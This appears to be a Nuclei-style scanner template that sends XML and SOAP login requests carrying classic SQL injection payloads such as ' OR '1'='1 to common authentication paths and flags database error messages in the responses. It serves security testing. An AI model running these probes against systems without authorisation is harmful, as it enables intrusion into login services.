http:
- body: "\n<auth>\n  <login>{{injection_payload}}</login>\n  <password>test123</password>\n\
    </auth>\n"
  headers:
    Accept: application/xml
    Content-Type: application/xml
  matchers:
  - condition: or
    part: body
    type: word
    words:
    - SQL error code
    - Dynamic SQL Error
    - Token unknown
    - syntax error
    - mysql_fetch
    - ORA-00933
    - pg_query()
  matchers-condition: or
  method: POST
  path:
  - '{{BaseURL}}'
  - '{{BaseURL}}/api/auth'
  - '{{BaseURL}}/api/auth/login'
  - '{{BaseURL}}/api/login'
  - '{{BaseURL}}/api/sign-in'
  - '{{BaseURL}}/api/sigin'
  - '{{BaseURL}}/api/v1/login'
  - '{{BaseURL}}/api/v2/login'
  - '{{BaseURL}}/api/v3/login'
  - '{{BaseURL}}/api/v1/auth'
  - '{{BaseURL}}/api/v2/auth'
  - '{{BaseURL}}/api/v3/auth'
  - '{{BaseURL}}/auth/login'
  - '{{BaseURL}}/login'
  - '{{BaseURL}}/sign-in'
  - '{{BaseURL}}/signin'
  payloads:
    injection_payload:
    - ''''
    - ''''''
    - ''' OR ''1''=''1'
    - ''' OR 1=1--'
    - '''; SELECT 1--'
- body: "\n<credentials>\n  <email>{{injection_payload}}</email>\n  <pass>test123</pass>\n\
    </credentials>\n"
  headers:
    Accept: application/xml
    Content-Type: application/xml
  matchers:
  - condition: or
    part: body
    type: word
    words:
    - SQL error code
    - Dynamic SQL Error
    - Token unknown
    - syntax error
    - mysql_fetch
    - ORA-00933
    - pg_query()
  matchers-condition: or
  method: POST
  path:
  - '{{BaseURL}}/api/auth'
  - '{{BaseURL}}/xml/login'
  payloads:
    injection_payload:
    - ''''
    - ''''''
    - ''' OR ''1''=''1'
    - ''' OR 1=1--'
    - '''; SELECT 1--'
- body: "\n<soap:Envelope\n  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
    \n  xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\n  xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    >\n  <soap:Body>\n    <Login xmlns=\"http://tempuri.org/\">\n      <username>{{injection_payload}}</username>\n\
    \      <password>test123</password>\n    </Login>\n  </soap:Body>\n</soap:Envelope>\n"
  headers:
    Content-Type: text/xml; charset=utf-8
    SOAPAction: http://tempuri.org/Login
  matchers:
  - condition: or
    part: body
    type: word
    words:
    - SQL error code
    - Dynamic SQL Error
    - Token unknown
    - syntax error
    - mysql_fetch
    - ORA-00933
    - pg_query()
    - faultstring
    - soap:Fault
  matchers-condition: or
  method: POST
  path:
  - '{{BaseURL}}/soap/login'
  - '{{BaseURL}}/ws/auth'
  - '{{BaseURL}}/service.asmx'
  payloads:
    injection_payload:
    - ''''
    - ''''''
    - ''' OR ''1''=''1'
    - ''' OR 1=1--'
    - '''; SELECT 1--'
id: sqli-error-based-detection-xml
info:
  author: reewardius
  description: Detects SQL injection via error messages in XML and SOAP endpoints
  name: "SQL Injection Error Based \u2014 XML / SOAP"
  severity: high
  tags: sqli,injection,xml,soap
